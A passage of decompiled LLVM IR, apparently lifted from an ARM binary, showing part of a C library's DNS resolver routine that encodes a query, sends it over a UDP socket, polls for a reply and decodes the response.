  %v2_1b744 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1b98856 = icmp sgt i32 %tmp159, 0
  %v2_1b8b0 = icmp ne i32 %v0_1b294, 0
  %v7_1b8b0 = icmp eq i32 %v0_1b294, 1
  %v1_1b7a4 = bitcast i32* %stack_var_-448 to i8*
  %v2_1b858 = icmp eq i32 %tmp144, 0
  %v2_1b660 = icmp ugt i8 %v3_1b30c, 45
  %v7_1b660 = icmp eq i8 %v3_1b30c, 46
  %v1_1b40c = add i32 %v1_1b2dc, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_1b3ec = add i32 %v1_1b2dc, %v3_1b2a8
  %v5_1b3ec = inttoptr i32 %v4_1b3ec to i8*
  %v1_1b650.cmp = icmp ugt i32 %v1_1b650, 1
  %v2_1b688 = icmp eq i32 %tmp160, 0
  %v3_1b8b4 = icmp ugt i32 %v0_1b294, 27
  %v8_1b8b4 = icmp eq i32 %v0_1b294, 28
  br label %dec_label_pc_1b37c

dec_label_pc_1b37c:                               ; preds = %dec_label_pc_1b9c4, %dec_label_pc_1b304
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_1b304 ], [ %v1_1b9c8, %dec_label_pc_1b9c4 ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_1b304 ], [ %v3_1b490, %dec_label_pc_1b9c4 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_1b304 ], [ %stack_var_-468.2, %dec_label_pc_1b9c4 ]
  %v1_1b384 = phi i32 [ -1, %dec_label_pc_1b304 ], [ %v3_1b564, %dec_label_pc_1b9c4 ]
  store i32 %v1_1b384, i32* %r3.global-to-local, align 4
  %v2_1b380 = icmp eq i32 %v1_1b384, -1
  store i1 %v2_1b380, i1* %cpsr_c.global-to-local, align 1
  %v7_1b380 = icmp eq i32 %v1_1b384, -1
  br i1 %v7_1b380, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_1b37c
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_1b37c, %bb215
  %v1_1b388 = xor i1 %v7_1b380, true
  call void @__pseudo_cond_branch(i1 %v1_1b388, i32 ptrtoint (i32* @global_var_12104.1348 to i32))
  store i32 40, i32* @r7, align 4
  %v0_1b394 = load i32, i32* @r8, align 4
  %v2_1b394 = add i32 %v0_1b394, 44
  %v3_1b394 = inttoptr i32 %v2_1b394 to i32*
  %v4_1b394 = load i32, i32* %v3_1b394, align 4
  store i32 %v4_1b394, i32* @r4, align 4
  store i32 %v2_1b398, i32* @r5, align 4
  store i32 80, i32* %ip.global-to-local, align 4
  %v2_1b3a4 = add i32 %v0_1b394, 40
  %v3_1b3a4 = inttoptr i32 %v2_1b3a4 to i32*
  %v4_1b3a4 = load i32, i32* %v3_1b3a4, align 4
  store i32 %v4_1b3a4, i32* %r1.global-to-local, align 4
  %v2_1b3ac = add i32 %v0_1b394, 80
  %v3_1b3ac = inttoptr i32 %v2_1b3ac to i32*
  %v4_1b3ac = load i32, i32* %v3_1b3ac, align 4
  store i32 %v4_1b3ac, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1b3ac)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_1b3c0 = load i32, i32* @r8, align 4
  %v2_1b3c0 = add i32 %v0_1b3c0, 20
  %v3_1b3c0 = inttoptr i32 %v2_1b3c0 to i32*
  %v4_1b3c0 = load i32, i32* %v3_1b3c0, align 4
  store i32 %v4_1b3c0, i32* %ip.global-to-local, align 4
  store i32 111564, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1b3c0)
  %v0_1b3cc = call i32 @__open_nameservers()
  %v0_1b3d4 = load i32, i32* @r8, align 4
  %v2_1b3d4 = add i32 %v0_1b3d4, 27572
  %v3_1b3d4 = inttoptr i32 %v2_1b3d4 to i32*
  %v4_1b3d4 = load i32, i32* %v3_1b3d4, align 4
  store i32 %v1_1b2dc, i32* %r3.global-to-local, align 4
  store i32 %v3_1b2a8, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_1b3e4 = load i32, i32* @sb, align 4
  %v3_1b3e4 = icmp uge i32 %v0_1b3e4, %v4_1b3d4
  store i1 %v3_1b3e4, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_1b3ec, align 1
  %v0_1b3f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1b3f0, label %dec_label_pc_1b41c, label %dec_label_pc_1b3f4

dec_label_pc_1b3f4:                               ; preds = %bb216
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_1b3fc = load i32, i32* %ip.global-to-local, align 4
  %v4_1b3fc = add i32 %v3_1b3fc, %v1_1b2dc
  %v5_1b3fc = inttoptr i32 %v4_1b3fc to i8*
  store i8 46, i8* %v5_1b3fc, align 1
  store i32 27560, i32* %r1.global-to-local, align 4
  %v0_1b408 = load i32, i32* @r8, align 4
  %v2_1b408 = add i32 %v0_1b408, 27560
  %v3_1b408 = inttoptr i32 %v2_1b408 to i32*
  %v4_1b408 = load i32, i32* %v3_1b408, align 4
  store i32 %v4_1b408, i32* %r3.global-to-local, align 4
  %v1_1b410 = load i32, i32* %ip.global-to-local, align 4
  %v2_1b410 = add i32 %v1_1b40c, %v1_1b410
  %v1_1b414 = load i32, i32* @sb, align 4
  %v2_1b414 = and i32 %v1_1b414, 1073741824
  %v3_1b414 = icmp ne i32 %v2_1b414, 0
  store i1 %v3_1b414, i1* %cpsr_c.global-to-local, align 1
  %v4_1b414 = mul i32 %v1_1b414, 4
  %v5_1b414 = add i32 %v4_1b414, %v4_1b408
  %v6_1b414 = inttoptr i32 %v5_1b414 to i32*
  %v7_1b414 = load i32, i32* %v6_1b414, align 4
  store i32 %v7_1b414, i32* @r1, align 4
  %v2_1b418 = inttoptr i32 %v2_1b410 to i8*
  %v3_1b418 = call i32 @strcpy(i8* %v2_1b418, i32 %v7_1b414)
  br label %dec_label_pc_1b41c

dec_label_pc_1b41c:                               ; preds = %bb216, %dec_label_pc_1b3f4
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b420 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_1b420, label %dec_label_pc_1b428, label %dec_label_pc_1b41c.dec_label_pc_1b458_crit_edge

dec_label_pc_1b41c.dec_label_pc_1b458_crit_edge:  ; preds = %dec_label_pc_1b41c
  %v0_1b460.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1b458

dec_label_pc_1b428:                               ; preds = %dec_label_pc_1b41c
  store i32 27568, i32* %r3.global-to-local, align 4
  store i32 1343, i32* %ip.global-to-local, align 4
  %v0_1b430 = load i32, i32* @r8, align 4
  %v2_1b430 = add i32 %v0_1b430, 27568
  %v3_1b430 = inttoptr i32 %v2_1b430 to i32*
  %v4_1b430 = load i32, i32* %v3_1b430, align 4
  %v2_1b434 = add i32 %v0_1b430, 1343
  %v3_1b434 = inttoptr i32 %v2_1b434 to i8*
  %v4_1b434 = load i8, i8* %v3_1b434, align 1
  %v6_1b434 = zext i8 %v4_1b434 to i32
  %v2_1b438 = mul i32 %v6_1b434, %v4_1b430
  store i32 %v2_1b438, i32* %r3.global-to-local, align 4
  store i32 26524, i32* %r1.global-to-local, align 4
  %v2_1b444 = add i32 %v0_1b430, 1340
  %v3_1b444 = inttoptr i32 %v2_1b444 to i16*
  %v4_1b444 = load i16, i16* %v3_1b444, align 2
  %v6_1b444 = zext i16 %v4_1b444 to i32
  %v2_1b448 = add i32 %v0_1b430, 26524
  %v3_1b448 = inttoptr i32 %v2_1b448 to i32*
  %v4_1b448 = load i32, i32* %v3_1b448, align 4
  store i32 %v4_1b448, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b458

dec_label_pc_1b458:                               ; preds = %dec_label_pc_1b41c.dec_label_pc_1b458_crit_edge, %dec_label_pc_1b428
  %v2_1b49c = phi i32 [ %v0_1b430, %dec_label_pc_1b428 ], [ %v0_1b460.pre, %dec_label_pc_1b41c.dec_label_pc_1b458_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_1b444, %dec_label_pc_1b428 ], [ %stack_var_-464.0, %dec_label_pc_1b41c.dec_label_pc_1b458_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_1b448, %dec_label_pc_1b428 ], [ %stack_var_-468.0, %dec_label_pc_1b41c.dec_label_pc_1b458_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_1b438, %dec_label_pc_1b428 ], [ %stack_var_-476.0, %dec_label_pc_1b41c.dec_label_pc_1b458_crit_edge ]
  store i32 27568, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_1b460 = add i32 %v2_1b49c, 27568
  %v3_1b460 = inttoptr i32 %v2_1b460 to i32*
  %v4_1b460 = load i32, i32* %v3_1b460, align 4
  store i32 27564, i32* %r3.global-to-local, align 4
  %v3_1b468 = icmp uge i32 %stack_var_-468.1, %v4_1b460
  store i1 %v3_1b468, i1* %cpsr_c.global-to-local, align 1
  %v2_1b46c = add i32 %v2_1b49c, 27564
  %v3_1b46c = inttoptr i32 %v2_1b46c to i32*
  %v4_1b46c = load i32, i32* %v3_1b46c, align 4
  store i32 %v4_1b46c, i32* %r3.global-to-local, align 4
  br i1 %v3_1b468, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_1b458
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_1b458, %bb217
  %v0_1b478 = phi i32 [ %stack_var_-468.1, %dec_label_pc_1b458 ], [ 0, %bb217 ]
  %v3_1b478 = mul i32 %v0_1b478, 28
  %v4_1b478 = add i32 %v3_1b478, %v4_1b46c
  store i32 %v4_1b478, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_1b484 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1b490 = urem i32 %v1_1b484, 65536
  store i32 26524, i32* %r1.global-to-local, align 4
  %v1_1b49c = trunc i32 %v1_1b484 to i16
  %v4_1b49c = add i32 %v2_1b49c, 1340
  %v5_1b49c = inttoptr i32 %v4_1b49c to i16*
  store i16 %v1_1b49c, i16* %v5_1b49c, align 2
  %v1_1b4a4 = load i32, i32* @r8, align 4
  %v2_1b4a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_1b4a4 = add i32 %v2_1b4a4, %v1_1b4a4
  %v4_1b4a4 = inttoptr i32 %v3_1b4a4 to i32*
  store i32 %v0_1b478, i32* %v4_1b4a4, align 4
  %v0_1b4a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b4ac = inttoptr i32 %v0_1b4a8 to i32*
  %v2_1b4ac = load i32, i32* %v1_1b4ac, align 4
  %v3_1b4ac = add i32 %v0_1b4a8, 4
  %v4_1b4ac = inttoptr i32 %v3_1b4ac to i32*
  %v5_1b4ac = load i32, i32* %v4_1b4ac, align 4
  store i32 %v5_1b4ac, i32* %r1.global-to-local, align 4
  %v9_1b4ac = add i32 %v0_1b4a8, 12
  %v10_1b4ac = inttoptr i32 %v9_1b4ac to i32*
  %v11_1b4ac = load i32, i32* %v10_1b4ac, align 4
  store i32 %v11_1b4ac, i32* %r3.global-to-local, align 4
  %v12_1b4ac = add i32 %v0_1b4a8, 16
  %v4_1b4b4 = trunc i32 %v2_1b4ac to i16
  store i16 %v4_1b4b4, i16* %stack_var_-104, align 2
  store i32 %v15_1b4b4, i32* %ip.global-to-local, align 4
  %v1_1b4b8 = inttoptr i32 %v12_1b4ac to i32*
  %v2_1b4b8 = load i32, i32* %v1_1b4b8, align 4
  %v3_1b4b8 = add i32 %v0_1b4a8, 20
  %v4_1b4b8 = inttoptr i32 %v3_1b4b8 to i32*
  %v5_1b4b8 = load i32, i32* %v4_1b4b8, align 4
  store i32 %v5_1b4b8, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  store i32 %v2_1b4b8, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1b4cc = load i32, i32* @r8, align 4
  %v2_1b4cc = add i32 %v0_1b4cc, 28
  %v3_1b4cc = inttoptr i32 %v2_1b4cc to i32*
  %v4_1b4cc = load i32, i32* %v3_1b4cc, align 4
  store i32 %v4_1b4cc, i32* %ip.global-to-local, align 4
  store i32 111832, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1b4cc)
  store i32 %v2_1b4d8, i32* @r6, align 4
  %v0_1b4dc = load i32, i32* @r7, align 4
  store i32 %v0_1b4dc, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_1b4e4 = load i32, i32* @sl, align 4
  %v2_1b4e8 = inttoptr i32 %v0_1b4e4 to i8*
  %v3_1b4e8 = call i32 @__GI_memset(i8* %v2_1b4e8, i32 %v0_1b4dc)
  %v0_1b4ec = load i32, i32* @r7, align 4
  store i32 %v0_1b4ec, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_1b4f8 = call i32 @__GI_memset(i8* %v2_1b4f8, i32 %v0_1b4ec)
  store i32 %v3_1b490, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_1b508 = load i32, i32* @sl, align 4
  store i32 %v0_1b508, i32* %r1.global-to-local, align 4
  store i32 %v3_1b490, i32* %stack_var_-192, align 4
  %v6_1b51c = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_1b508, i32 512, i32 %v3_1b490, i32 %v3_1b490)
  store i32 %v6_1b51c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b520 = icmp slt i32 %v6_1b51c, 0
  br i1 %v1_1b520, label %dec_label_pc_1b9dc, label %dec_label_pc_1b528

dec_label_pc_1b528:                               ; preds = %bb218
  store i32 %v0_1b294, i32* @ip, align 4
  store i32 %v1_1b2dc, i32* @r5, align 4
  %v0_1b538 = load i32, i32* @sl, align 4
  %v2_1b538 = add i32 %v0_1b538, %v6_1b51c
  store i32 %v2_1b538, i32* %r1.global-to-local, align 4
  %v1_1b53c = sub i32 512, %v6_1b51c
  store i32 %v1_1b2dc, i32* %stack_var_-60, align 4
  store i32 %v0_1b294, i32* %stack_var_-56, align 4
  %v4_1b548 = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_1b538, i32 %v1_1b53c)
  store i32 %v4_1b548, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b54c = icmp slt i32 %v4_1b548, 0
  br i1 %v1_1b54c, label %dec_label_pc_1b9dc, label %dec_label_pc_1b554

dec_label_pc_1b554:                               ; preds = %dec_label_pc_1b528
  %v3_1b558 = load i16, i16* %stack_var_-104, align 2
  %v4_1b558 = sext i16 %v3_1b558 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_1b564 = call i32 @socket(i32 %v4_1b558, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b568 = icmp slt i32 %v3_1b564, 0
  br i1 %v1_1b568, label %dec_label_pc_1b9b4, label %dec_label_pc_1b574

dec_label_pc_1b574:                               ; preds = %dec_label_pc_1b554
  store i32 %v2_1b4b0, i32* %r1.global-to-local, align 4
  %v3_1b57c = call i32 @__libc_connect(i32 %v3_1b564, i32 %v2_1b4b0, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b580 = icmp slt i32 %v3_1b57c, 0
  br i1 %v1_1b580, label %dec_label_pc_1b9b4, label %dec_label_pc_1b588

dec_label_pc_1b588:                               ; preds = %dec_label_pc_1b574
  %v0_1b588 = load i32, i32* @r5, align 4
  %v1_1b588 = load i32, i32* @r4, align 4
  %v2_1b588 = add i32 %v1_1b588, %v0_1b588
  %v0_1b58c = load i32, i32* @r7, align 4
  store i32 %v0_1b58c, i32* %r3.global-to-local, align 4
  %v0_1b594 = load i32, i32* @sl, align 4
  store i32 %v0_1b594, i32* %r1.global-to-local, align 4
  %v4_1b598 = call i32 @__libc_send(i32 %v3_1b564, i32 %v0_1b594, i32 %v2_1b588, i32 %v0_1b58c)
  store i32 1342, i32* %r3.global-to-local, align 4
  %v0_1b5a0 = load i32, i32* @r8, align 4
  %v2_1b5a0 = add i32 %v0_1b5a0, 1342
  %v3_1b5a0 = inttoptr i32 %v2_1b5a0 to i8*
  %v4_1b5a0 = load i8, i8* %v3_1b5a0, align 1
  %v6_1b5a0 = zext i8 %v4_1b5a0 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_1b5a8 = mul nuw nsw i32 %v6_1b5a0, 1000
  store i32 %v2_1b5a8, i32* @r4, align 4
  store i32 %v2_1b5ac, i32* @r5, align 4
  br label %dec_label_pc_1b5b0

dec_label_pc_1b5b0:                               ; preds = %thread-pre-split, %dec_label_pc_1b588
  %v0_1b5bc = phi i32 [ %v1_1b5fc, %thread-pre-split ], [ %v2_1b5a8, %dec_label_pc_1b588 ]
  store i32 %v3_1b564, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_1b5b8, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_1b564, i32* %stack_var_-48, align 4
  %v7_1b5d0 = call i32 @__GI_poll(i32 %v2_1b5ac, i32 1, i32 %v0_1b5bc, i32 %v3_1b564, i32 %v3_1b564, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_1b5d8 = load i32, i32* @sl, align 4
  store i32 %v0_1b5d8, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_1b5d0, 1
  br i1 %tmp219, label %dec_label_pc_1b9b4, label %dec_label_pc_1b5ec

dec_label_pc_1b5ec:                               ; preds = %dec_label_pc_1b5b0
  %v5_1b5ec = call i32 @__libc_recv(i32 %v3_1b564, i32 %v0_1b5d8, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_1b5f0 = icmp ugt i32 %v5_1b5ec, 10
  store i1 %v2_1b5f0, i1* %cpsr_c.global-to-local, align 1
  %v8_1b5f8 = icmp sgt i32 %v5_1b5ec, 11
  br i1 %v8_1b5f8, label %dec_label_pc_1b624, label %dec_label_pc_1b5fc

dec_label_pc_1b5fc:                               ; preds = %dec_label_pc_1b624, %dec_label_pc_1b640, %dec_label_pc_1b5ec
  %v0_1b5fc = load i32, i32* @r4, align 4
  %v1_1b5fc = add i32 %v0_1b5fc, -1000
  store i32 %v1_1b5fc, i32* @r4, align 4
  %v7_1b5fc = icmp eq i32 %v0_1b5fc, 1000
  %tmp283 = zext i1 %v7_1b5fc to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b60c = icmp slt i32 %v5_1b5ec, 0
  br i1 %v1_1b60c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_1b5fc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1b9b4

thread-pre-split:                                 ; preds = %dec_label_pc_1b5fc
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1b5fc, label %dec_label_pc_1b9b4, label %dec_label_pc_1b5b0

dec_label_pc_1b624:                               ; preds = %dec_label_pc_1b5ec
  store i32 %v2_1b4d8, i32* %r1.global-to-local, align 4
  %v0_1b628 = load i32, i32* @sl, align 4
  %v2_1b62c = inttoptr i32 %v0_1b628 to i8*
  %v3_1b62c = call i32 @__decode_header(i8* %v2_1b62c, i32 %v2_1b4d8)
  %v3_1b630 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_1b630, i32* %r3.global-to-local, align 4
  store i32 %v3_1b490, i32* %r1.global-to-local, align 4
  %v3_1b638 = icmp uge i32 %v3_1b630, %v3_1b490
  store i1 %v3_1b638, i1* %cpsr_c.global-to-local, align 1
  %v9_1b638 = icmp eq i32 %v3_1b630, %v3_1b490
  br i1 %v9_1b638, label %dec_label_pc_1b640, label %dec_label_pc_1b5fc

dec_label_pc_1b640:                               ; preds = %dec_label_pc_1b624
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1b644, label %dec_label_pc_1b5fc, label %dec_label_pc_1b64c

dec_label_pc_1b64c:                               ; preds = %dec_label_pc_1b640
  store i32 %v1_1b650, i32* %r3.global-to-local, align 4
  store i1 %v2_1b654, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_1b650.cmp, label %dec_label_pc_1b688, label %dec_label_pc_1b65c

dec_label_pc_1b65c:                               ; preds = %dec_label_pc_1b64c
  store i1 %v2_1b660, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1b660, label %dec_label_pc_1b67c, label %dec_label_pc_1b668

dec_label_pc_1b668:                               ; preds = %dec_label_pc_1b65c
  store i32 %v4_1b3d4, i32* @r5, align 4
  %v1_1b66c = add i32 %v4_1b3d4, -1
  store i32 %v1_1b66c, i32* %r3.global-to-local, align 4
  %v0_1b670 = load i32, i32* @sb, align 4
  %v3_1b670 = icmp uge i32 %v0_1b670, %v1_1b66c
  store i1 %v3_1b670, i1* %cpsr_c.global-to-local, align 1
  %v5_1b674 = icmp slt i32 %v0_1b670, %v1_1b66c
  br i1 %v5_1b674, label %.thread7, label %dec_label_pc_1b67c

.thread7:                                         ; preds = %dec_label_pc_1b668
  %v7_1b674 = add i32 %v0_1b670, 1
  br label %dec_label_pc_1b9c4

dec_label_pc_1b67c:                               ; preds = %dec_label_pc_1b668, %dec_label_pc_1b65c
  %v0_1b67c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1b6b0

dec_label_pc_1b688:                               ; preds = %dec_label_pc_1b64c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1b688, label %dec_label_pc_1b690, label %dec_label_pc_1b9b4

dec_label_pc_1b690:                               ; preds = %dec_label_pc_1b688
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_1b6a8, label %dec_label_pc_1b6b8

dec_label_pc_1b6a8:                               ; preds = %dec_label_pc_1b690
  %v0_1b6a8 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1b6b0

dec_label_pc_1b6b0:                               ; preds = %dec_label_pc_1b67c, %dec_label_pc_1b6a8
  %storemerge2 = phi i32 [ %v0_1b6a8, %dec_label_pc_1b6a8 ], [ %v0_1b67c, %dec_label_pc_1b67c ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1b6a8 ], [ 1, %dec_label_pc_1b67c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_1b6b0 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_1b6b0, align 4
  br label %dec_label_pc_1b9fc

dec_label_pc_1b6b8:                               ; preds = %dec_label_pc_1b690
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1b6bc.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_1b6bc = add i32 %v0_1b6bc.pre, 12
  store i32 %v2_1b6bc, i32* @r4, align 4
  %v3_1b6bc = icmp ugt i32 %v0_1b6bc.pre, -13
  store i1 %v3_1b6bc, i1* %cpsr_c.global-to-local, align 1
  %v9_1b6bc = icmp eq i32 %v2_1b6bc, 0
  br i1 %v9_1b6bc, label %dec_label_pc_1b9b4, label %dec_label_pc_1b6c4

dec_label_pc_1b6c4:                               ; preds = %dec_label_pc_1b6b8
  %v2_1b6c8 = add i32 %v5_1b5ec, -12
  store i32 %v2_1b6c8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_1b6c8, 1
  br i1 %tmp223, label %dec_label_pc_1b9b4, label %dec_label_pc_1b6d8

dec_label_pc_1b6d0thread-pre-split:               ; preds = %dec_label_pc_1b6f4
  %v2_1b70015 = add i32 %v2_1b6e4, -1
  store i32 %v2_1b70015, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_1b70015, 1
  br i1 %tmp224, label %dec_label_pc_1b9b4, label %dec_label_pc_1b6d8

dec_label_pc_1b6d8:                               ; preds = %dec_label_pc_1b6c4, %dec_label_pc_1b6d0thread-pre-split
  %v1_1b6fc = phi i32 [ %v2_1b70015, %dec_label_pc_1b6d0thread-pre-split ], [ %v2_1b6c8, %dec_label_pc_1b6c4 ]
  %v0_1b6d8 = phi i32 [ %v2_1b6ec, %dec_label_pc_1b6d0thread-pre-split ], [ %v2_1b6bc, %dec_label_pc_1b6c4 ]
  %v1_1b6d8 = inttoptr i32 %v0_1b6d8 to i8*
  %v2_1b6d8 = load i8, i8* %v1_1b6d8, align 1
  %v3_1b6d8 = zext i8 %v2_1b6d8 to i32
  store i32 %v3_1b6d8, i32* %r3.global-to-local, align 4
  %v5_1b6d8 = add i32 %v0_1b6d8, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b6dc = icmp eq i8 %v2_1b6d8, 0
  %v2_1b6e4 = sub i32 %v1_1b6fc, %v3_1b6d8
  store i32 %v2_1b6e4, i32* @lr, align 4
  %v1_1b6e8 = and i32 %v3_1b6d8, 192
  store i32 %v1_1b6e8, i32* @ip, align 4
  %v2_1b6ec = add i32 %v3_1b6d8, %v5_1b6d8
  br i1 %v2_1b6dc, label %dec_label_pc_1b708, label %dec_label_pc_1b6f4

dec_label_pc_1b6f4:                               ; preds = %dec_label_pc_1b6d8
  %v2_1b6f4 = icmp eq i32 %v1_1b6e8, 192
  store i1 %v2_1b6f4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1b6f4, label %.thread9, label %dec_label_pc_1b6d0thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_1b6f4
  %v2_1b6f8 = add i32 %v0_1b6d8, 2
  %v2_1b6fc = add i32 %v1_1b6fc, -2
  store i32 %v2_1b6fc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b708

dec_label_pc_1b708:                               ; preds = %dec_label_pc_1b6d8, %.thread9
  %v1_1b714 = phi i32 [ %v2_1b6f8, %.thread9 ], [ %v5_1b6d8, %dec_label_pc_1b6d8 ]
  %v0_1b708 = phi i32 [ %v2_1b6fc, %.thread9 ], [ %v1_1b6fc, %dec_label_pc_1b6d8 ]
  %v1_1b708 = add i32 %v0_1b708, -3
  %v2_1b708 = icmp ugt i32 %v0_1b708, 2
  store i1 %v2_1b708, i1* %cpsr_c.global-to-local, align 1
  %v3_1b708 = sub i32 2, %v0_1b708
  %v4_1b708 = and i32 %v3_1b708, %v0_1b708
  %v5_1b708 = icmp slt i32 %v4_1b708, 0
  %v6_1b708 = icmp slt i32 %v1_1b708, 0
  %v7_1b708 = icmp eq i32 %v0_1b708, 3
  %v3_1b70c = xor i1 %v6_1b708, %v5_1b708
  %v4_1b70c = or i1 %v7_1b708, %v3_1b70c
  br i1 %v4_1b70c, label %dec_label_pc_1b9b4, label %dec_label_pc_1b710

dec_label_pc_1b710:                               ; preds = %dec_label_pc_1b708
  %v1_1b710 = sub i32 -8, %v0_1b6bc.pre
  %v2_1b714 = add i32 %v1_1b714, %v1_1b710
  store i32 %v2_1b714, i32* %r3.global-to-local, align 4
  %v3_1b714 = icmp ult i32 %v2_1b714, %v1_1b710
  store i1 %v3_1b714, i1* %cpsr_c.global-to-local, align 1
  %v8_1b714 = icmp slt i32 %v2_1b714, 0
  br i1 %v8_1b714, label %dec_label_pc_1b9b4, label %dec_label_pc_1b738

dec_label_pc_1b738:                               ; preds = %dec_label_pc_1b710
  %v2_1b720 = add i32 %v2_1b714, 12
  store i32 %v2_1b720, i32* %r1.global-to-local, align 4
  store i32 %v2_1b740, i32* @r5, align 4
  store i32 %v2_1b744, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1b98856, label %dec_label_pc_1b75c, label %dec_label_pc_1b98c

dec_label_pc_1b75c:                               ; preds = %dec_label_pc_1b738, %dec_label_pc_1b964.dec_label_pc_1b75c_crit_edge
  %v0_1b760 = phi i32 [ %v0_1b760.pre, %dec_label_pc_1b964.dec_label_pc_1b75c_crit_edge ], [ %v0_1b6bc.pre, %dec_label_pc_1b738 ]
  %stack_var_-460.364 = phi i32 [ %v2_1b96c, %dec_label_pc_1b964.dec_label_pc_1b75c_crit_edge ], [ %v2_1b720, %dec_label_pc_1b738 ]
  %stack_var_-452.061 = phi i32 [ %v1_1b970, %dec_label_pc_1b964.dec_label_pc_1b75c_crit_edge ], [ 0, %dec_label_pc_1b738 ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_1b964.dec_label_pc_1b75c_crit_edge ], [ 1, %dec_label_pc_1b738 ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_1b740, i32* %r3.global-to-local, align 4
  %v5_1b774 = call i32 @__decode_dotted(i32 %v0_1b760, i32 %stack_var_-460.364, i32 %v5_1b5ec, i32 %v2_1b740, i32 256)
  store i32 %v5_1b774, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b778 = icmp slt i32 %v5_1b774, 0
